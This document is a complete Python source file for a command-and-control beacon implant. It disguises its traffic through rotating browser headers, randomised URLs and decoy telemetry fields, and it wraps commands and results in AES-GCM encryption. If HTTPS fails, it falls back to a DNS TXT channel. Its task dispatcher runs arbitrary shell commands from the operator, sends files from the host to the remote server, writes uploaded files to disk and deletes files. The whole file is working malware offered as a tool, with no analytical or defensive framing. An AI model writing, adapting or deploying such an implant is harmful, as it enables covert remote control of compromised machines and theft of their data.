#!/usr/bin/env python3
"""
C2 beacon with HTTPS primary and DNS fallback channels.
AES-GCM encrypted payloads, Venom-style network evasion,
full command set with result reporting.
"""

import base64
import hashlib
import json
import logging
import os
import platform
import random
import shutil
import stat
import subprocess
import threading
import time
from pathlib import Path
from typing import Optional

import requests
import dns.resolver
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

logger = logging.getLogger("raccoon.c2")


# ── Evasion pools ──

_USER_AGENTS = [
    "Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux aarch64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
]

_URL_SUFFIXES = [
    "/collect", "/submit", "/sync", "/push", "/update",
    "/report", "/log", "/track", "/event", "/data",
    "/ping", "/health", "/status", "/check", "/query",
]

_ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
    "fr-FR,fr;q=0.9,en-US;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "pt-BR,pt;q=0.9,en;q=0.8",
    "nl-NL,nl;q=0.9,en;q=0.8",
    "it-IT,it;q=0.9,en;q=0.8",
]

_EXTRA_HEADERS = {
    "Sec-Ch-Ua-Platform": ['"Linux"', '"Windows"', '"macOS"'],
    "Sec-Fetch-Dest": ["empty", "document"],
    "Sec-Fetch-Mode": ["cors", "navigate", "no-cors"],
    "Sec-Fetch-Site": ["same-origin", "cross-site"],
    "Cache-Control": ["no-cache", "max-age=0", "no-store"],
    "Pragma": ["no-cache"],
    "DNT": ["1"],
    "X-Requested-With": ["XMLHttpRequest"],
}

_PAYLOAD_FIELDS = [
    "session_token", "auth_hash", "state_key", "nonce", "validation",
    "api_key", "request_token", "cipher_text", "payload_data", "signature",
    "trace_id", "correlation_id", "request_id", "transaction_id",
]


def _decoy_fields(n: int) -> dict:
    """Generate n random telemetry-like decoy fields."""
    pool = {
        "cpu_pct": lambda: round(random.uniform(2, 90), 1),
        "mem_mb": lambda: random.randint(64, 8192),
        "disk_pct": lambda: round(random.uniform(10, 95), 1),
        "request_count": lambda: random.randint(100, 99999),
        "session_count": lambda: random.randint(1, 5000),
        "error_rate": lambda: round(random.uniform(0, 5), 2),
        "latency_ms": lambda: random.randint(1, 500),
        "uptime_hrs": lambda: round(random.uniform(0.1, 720), 1),
        "queue_depth": lambda: random.randint(0, 1000),
        "cache_hit_pct": lambda: round(random.uniform(50, 99.9), 1),
        "gc_pause_ms": lambda: round(random.uniform(0.1, 50), 2),
        "thread_count": lambda: random.randint(4, 128),
        "conn_pool_active": lambda: random.randint(1, 50),
        "batch_size": lambda: random.randint(10, 500),
    }
    keys = random.sample(list(pool.keys()), min(n, len(pool)))
    return {k: pool[k]() for k in keys}


class Beacon:
    """C2 beacon with AES-GCM encryption and network evasion."""

    def __init__(self, config: dict):
        c2 = config["c2"]
        self.interval = c2.get("beacon_interval_seconds", 300)
        self.jitter = c2.get("jitter_percent", 20) / 100.0

        https_cfg = c2.get("https", {})
        dns_cfg = c2.get("dns", {})

        self.https_enabled = https_cfg.get("enabled", False)
        self.callback_url = https_cfg.get("callback_url", "")
        self.verify_ssl = https_cfg.get("verify_ssl", False)

        self.dns_enabled = dns_cfg.get("enabled", False)
        self.dns_domain = dns_cfg.get("domain", "")
        self.dns_resolver = dns_cfg.get("resolver", "8.8.8.8")

        enc_key = c2.get("encryption_key", "")
        if enc_key:
            self._key = base64.b64decode(enc_key)
        else:
            seed = f"{self.callback_url}:{self.dns_domain}".encode()
            self._key = hashlib.sha256(seed).digest()
        self._aesgcm = AESGCM(self._key)

        self._implant_id = self._generate_id()
        self._agent_id: Optional[str] = None
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._registered = False
        self._consecutive_failures = 0

    # ── Identity ──

    def _generate_id(self) -> str:
        raw = f"{platform.node()}:{platform.machine()}"
        try:
            raw += f":{open('/sys/class/net/eth0/address').read().strip()}"
        except (FileNotFoundError, PermissionError):
            pass
        return hashlib.sha256(raw.encode()).hexdigest()[:16]

    # ── Crypto ──

    def _encrypt(self, data: dict) -> str:
        plaintext = json.dumps(data, separators=(",", ":")).encode()
        nonce = os.urandom(12)
        ct = self._aesgcm.encrypt(nonce, plaintext, None)
        return base64.b64encode(nonce + ct).decode()

    def _decrypt(self, b64: str) -> dict:
        raw = base64.b64decode(b64)
        nonce, ct = raw[:12], raw[12:]
        plaintext = self._aesgcm.decrypt(nonce, ct, None)
        return json.loads(plaintext)

    # ── Evasion helpers ──

    def _evasive_url(self, endpoint: str) -> str:
        base = self.callback_url.rsplit("/", 1)[0]
        suffix = random.choice(_URL_SUFFIXES)
        ts = int(time.time() * 1000)
        qp = f"?_t={ts}&sid={random.randint(10000, 99999)}"
        return f"{base}/{endpoint}{suffix}{qp}"

    def _evasive_headers(self) -> dict:
        headers = {
            "User-Agent": random.choice(_USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": random.choice(_ACCEPT_LANGUAGES),
            "Content-Type": "application/json",
        }
        extra_keys = random.sample(
            list(_EXTRA_HEADERS.keys()),
            random.randint(2, min(4, len(_EXTRA_HEADERS))),
        )
        for k in extra_keys:
            headers[k] = random.choice(_EXTRA_HEADERS[k])
        return headers

    def _wrap_payload(self, data: dict) -> dict:
        encrypted = self._encrypt(data)
        field = random.choice(_PAYLOAD_FIELDS)
        payload = {field: encrypted}
        payload.update(_decoy_fields(random.randint(4, 10)))
        return dict(sorted(payload.items()))

    def _unwrap_response(self, body: dict) -> Optional[dict]:
        for field in _PAYLOAD_FIELDS:
            if field in body:
                try:
                    return self._decrypt(body[field])
                except Exception:
                    continue
        for v in body.values():
            if isinstance(v, str) and len(v) > 32:
                try:
                    return self._decrypt(v)
                except Exception:
                    continue
        return None

    # ── System info ──

    def _system_info(self) -> dict:
        return {
            "id": self._implant_id,
            "agent_id": self._agent_id,
            "hostname": platform.node(),
            "os": f"{platform.system()} {platform.release()}",
            "arch": platform.machine(),
            "pid": os.getpid(),
            "user": os.getenv("USER", os.getenv("USERNAME", "unknown")),
            "uptime": self._get_uptime(),
            "interval": self.interval,
        }

    @staticmethod
    def _get_uptime() -> int:
        try:
            with open("/proc/uptime") as f:
                return int(float(f.read().split()[0]))
        except (FileNotFoundError, PermissionError):
            return 0

    # ── Timing ──

    def _jittered_sleep(self):
        offset = self.interval * self.jitter
        delay = self.interval + random.uniform(-offset, offset)
        time.sleep(max(10, delay))

    def _backoff_sleep(self):
        delay = min(5 * (1.5 ** self._consecutive_failures), 300)
        delay += random.uniform(0, delay * 0.2)
        logger.debug("Backoff %.1fs (failures=%d)", delay, self._consecutive_failures)
        time.sleep(delay)

    # ── HTTPS transport ──

    def _https_post(self, endpoint: str, data: dict) -> Optional[dict]:
        """POST encrypted payload; returns decrypted response or None on error."""
        try:
            resp = requests.post(
                self._evasive_url(endpoint),
                json=self._wrap_payload(data),
                headers=self._evasive_headers(),
                verify=self.verify_ssl,
                timeout=30,
            )
            if resp.status_code == 200:
                body = resp.json()
                result = self._unwrap_response(body)
                return result if result else {}
        except Exception as e:
            logger.debug("HTTPS %s failed: %s", endpoint, e)
        return None

    def _register_https(self) -> bool:
        info = self._system_info()
        info["action"] = "register"
        result = self._https_post("register", info)
        if result is not None and result.get("success"):
            self._agent_id = result.get("agent_id", self._implant_id)
            self._registered = True
            logger.info("Registered as %s", self._agent_id)
            return True
        return False

    def _beacon_https(self) -> Optional[dict]:
        info = self._system_info()
        info["action"] = "beacon"
        return self._https_post("beacon", info)

    def _send_result_https(self, task_id: str, status: str, output: str,
                           data: Optional[dict] = None):
        result = {
            "action": "result",
            "agent_id": self._agent_id or self._implant_id,
            "task_id": task_id,
            "status": status,
            "output": output,
        }
        if data:
            result["data"] = data
        self._https_post("result", result)

    # ── DNS transport ──

    def _beacon_dns(self) -> Optional[dict]:
        try:
            agent = self._agent_id or self._implant_id
            encoded_id = base64.b32encode(agent.encode()).decode().rstrip("=").lower()
            query = f"{encoded_id}.b.{self.dns_domain}"

            resolver = dns.resolver.Resolver()
            resolver.nameservers = [self.dns_resolver]
            resolver.timeout = 10
            resolver.lifetime = 10

            answers = resolver.resolve(query, "TXT")
            for rdata in answers:
                txt = b"".join(rdata.strings).decode()
                try:
                    return self._decrypt(txt)
                except Exception:
                    try:
                        return json.loads(base64.b64decode(txt))
                    except Exception:
                        pass
        except Exception as e:
            logger.debug("DNS beacon failed: %s", e)
        return None

    # ── Command execution (pure Python for file ops, subprocess only for shell) ──

    def _exec_shell(self, cmd: str, timeout: int = 300) -> str:
        try:
            r = subprocess.run(
                cmd, shell=True,
                capture_output=True, text=True,
                timeout=timeout,
            )
            output = r.stdout
            if r.stderr:
                output += f"\n[stderr]\n{r.stderr}"
            if r.returncode != 0:
                output += f"\n[exit {r.returncode}]"
            return output[:65536]
        except subprocess.TimeoutExpired:
            return f"[timeout after {timeout}s]"
        except Exception as e:
            return f"[error: {e}]"

    def _exec_ls(self, path: str = ".") -> str:
        try:
            p = Path(path)
            if not p.exists():
                return f"ls: {path}: No such file or directory"
            lines = []
            for entry in sorted(p.iterdir()):
                try:
                    st = entry.stat()
                    mode = stat.filemode(st.st_mode)
                    size = st.st_size
                    mtime = time.strftime("%Y-%m-%d %H:%M", time.localtime(st.st_mtime))
                    lines.append(f"{mode} {size:>10} {mtime} {entry.name}")
                except OSError:
                    lines.append(f"?????????? ? {entry.name}")
            return "\n".join(lines) if lines else "(empty)"
        except Exception as e:
            return f"[error: {e}]"

    def _exec_cat(self, path: str) -> str:
        try:
            return Path(path).read_text(errors="replace")[:65536]
        except Exception as e:
            return f"[error: {e}]"

    def _exec_download(self, path: str) -> dict:
        try:
            data = Path(path).read_bytes()
            if len(data) > 10 * 1024 * 1024:
                return {"error": f"File too large ({len(data)} bytes, max 10MB)"}
            return {
                "filename": Path(path).name,
                "size": len(data),
                "data": base64.b64encode(data).decode(),
            }
        except Exception as e:
            return {"error": str(e)}

    def _exec_upload(self, path: str, data_b64: str) -> str:
        try:
            target = Path(path)
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_bytes(base64.b64decode(data_b64))
            return f"Uploaded {target} ({target.stat().st_size} bytes)"
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_pwd() -> str:
        return os.getcwd()

    @staticmethod
    def _exec_cd(path: str) -> str:
        try:
            os.chdir(path)
            return os.getcwd()
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_cp(src: str, dst: str) -> str:
        try:
            if Path(src).is_dir():
                shutil.copytree(src, dst)
            else:
                shutil.copy2(src, dst)
            return f"Copied {src} -> {dst}"
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_mv(src: str, dst: str) -> str:
        try:
            shutil.move(src, dst)
            return f"Moved {src} -> {dst}"
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_rm(path: str) -> str:
        try:
            p = Path(path)
            if p.is_dir():
                shutil.rmtree(path)
            else:
                p.unlink()
            return f"Removed {path}"
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_mkdir(path: str) -> str:
        try:
            Path(path).mkdir(parents=True, exist_ok=True)
            return f"Created {path}"
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_chmod(mode: str, path: str) -> str:
        try:
            os.chmod(path, int(mode, 8))
            return f"chmod {mode} {path}"
        except Exception as e:
            return f"[error: {e}]"

    @staticmethod
    def _exec_write(path: str, content: str) -> str:
        try:
            target = Path(path)
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text(content)
            return f"Wrote {len(content)} bytes to {path}"
        except Exception as e:
            return f"[error: {e}]"

    # ── Task dispatcher ──

    def _process_tasking(self, tasking: dict):
        if not tasking:
            return

        cmd = tasking.get("cmd", "")
        args = tasking.get("args", "")
        task_id = tasking.get("id", "")
        data = tasking.get("data", "")

        status = "ok"
        output = ""
        result_data = None

        try:
            if cmd == "sleep":
                parts = str(args).split()
                self.interval = max(1, float(parts[0]))
                if len(parts) > 1:
                    self.jitter = max(0, min(100, float(parts[1]))) / 100.0
                output = f"Sleep {self.interval}s jitter {int(self.jitter * 100)}%"
                logger.info(output)

            elif cmd == "kill":
                logger.warning("Kill command received")
                output = "Shutting down"
                self._running = False

            elif cmd == "shell":
                timeout = tasking.get("timeout", 300)
                output = self._exec_shell(args, timeout=timeout)

            elif cmd == "ls":
                output = self._exec_ls(args or ".")

            elif cmd == "cat":
                output = self._exec_cat(args)

            elif cmd == "pwd":
                output = self._exec_pwd()

            elif cmd == "cd":
                output = self._exec_cd(args)

            elif cmd == "cp":
                parts = args.split(None, 1)
                if len(parts) == 2:
                    output = self._exec_cp(parts[0], parts[1])
                else:
                    status, output = "error", "Usage: cp <src> <dst>"

            elif cmd == "mv":
                parts = args.split(None, 1)
                if len(parts) == 2:
                    output = self._exec_mv(parts[0], parts[1])
                else:
                    status, output = "error", "Usage: mv <src> <dst>"

            elif cmd == "rm":
                output = self._exec_rm(args)

            elif cmd == "mkdir":
                output = self._exec_mkdir(args)

            elif cmd == "chmod":
                parts = args.split(None, 1)
                if len(parts) == 2:
                    output = self._exec_chmod(parts[0], parts[1])
                else:
                    status, output = "error", "Usage: chmod <mode> <path>"

            elif cmd == "write":
                output = self._exec_write(args, data)

            elif cmd == "upload":
                output = self._exec_upload(args, data)

            elif cmd == "download":
                dl = self._exec_download(args)
                if "error" in dl:
                    status = "error"
                    output = dl["error"]
                else:
                    output = f"Downloaded {dl['filename']} ({dl['size']} bytes)"
                    result_data = dl

            elif cmd == "exfil":
                output = "Exfil scan triggered"
                logger.info("Exfil tasking received")

            else:
                status = "error"
                output = f"Unknown command: {cmd}"

        except Exception as e:
            status = "error"
            output = f"[exception: {e}]"

        if task_id and self.https_enabled:
            self._send_result_https(task_id, status, output, result_data)

    # ── Main loop ──

    def _beacon_loop(self):
        logger.info(
            "Beacon started — ID=%s interval=%ds jitter=%d%%",
            self._implant_id, self.interval, int(self.jitter * 100),
        )

        if self.https_enabled:
            attempts = 0
            while self._running and not self._registered and attempts < 10:
                if self._register_https():
                    self._consecutive_failures = 0
                    break
                attempts += 1
                self._consecutive_failures = attempts
                self._backoff_sleep()
            if not self._registered:
                logger.warning("Registration failed, proceeding unregistered")
                self._consecutive_failures = 0

        while self._running:
            tasking = None

            if self.https_enabled:
                tasking = self._beacon_https()

            if tasking is None and self.dns_enabled:
                tasking = self._beacon_dns()

            if tasking is None:
                self._consecutive_failures += 1
                if self._consecutive_failures > 0 and self._consecutive_failures % 5 == 0:
                    logger.info("Re-registering after %d failures", self._consecutive_failures)
                    self._registered = False
                    self._register_https()
            elif tasking:
                self._consecutive_failures = 0
                logger.debug("Tasking: %s", tasking.get("cmd", "?"))
                self._process_tasking(tasking)
            else:
                self._consecutive_failures = 0

            if self._consecutive_failures > 3:
                self._backoff_sleep()
            else:
                self._jittered_sleep()

    def start(self):
        self._running = True
        self._thread = threading.Thread(
            target=self._beacon_loop, daemon=True, name="c2-beacon",
        )
        self._thread.start()

    def stop(self):
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)
        logger.info("Beacon stopped")
